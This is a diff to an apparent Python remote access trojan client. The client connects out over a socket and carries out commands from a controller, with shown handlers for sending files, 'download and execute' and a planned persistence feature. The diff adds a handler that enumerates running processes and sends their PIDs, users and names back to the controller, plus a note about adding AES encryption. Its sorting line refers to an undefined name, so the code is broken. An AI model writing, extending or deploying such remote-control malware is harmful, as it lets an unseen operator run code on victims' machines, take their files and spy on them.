@@ -4,6 +4,8 @@
 #
 # Requires python3 module psutil to run.
 #
+# TODO Implement AES encryption
+#
 import os
 import sys
 import socket
@@ -83,9 +85,21 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     progBar.update(len(readBytes))
             print("File sent.")
 
-        elif int(cmd) == 5: # TODO Return Process List
-            exit()
+        elif int(cmd) == 5:  # get Process List
+            processList = psutil.pids()
+            processList = sorted(processList, key=lambda processList: process.pid)  # sort process list by PID
 
+            s.send(str(len(processList)).encode())
+
+            i = 0
+
+            while i < len(processList):
+                processStr = psutil.Process(processList[i])
+                p = str(processStr.pid) + ' ' + processStr.status() + ' ' + processStr.username() + \
+                    ' ' + processStr.name()
+                s.send(p.encode())
+                i += 1
+            s.send('done'.encode())
 
         elif int(cmd) == 6:  # download and execute
             filepath = s.recv(BUFF_SIZE).decode()
@@ -118,4 +132,10 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             exit()
 
         elif int(cmd) == 9: # TODO Persistence
+            exit()
+
+        elif int(cmd) == 0:  # Exit
+            exit()
+
+        else:  # Not really distinct from if cmd == 0, but covers invalid command args. just exit
             exit()
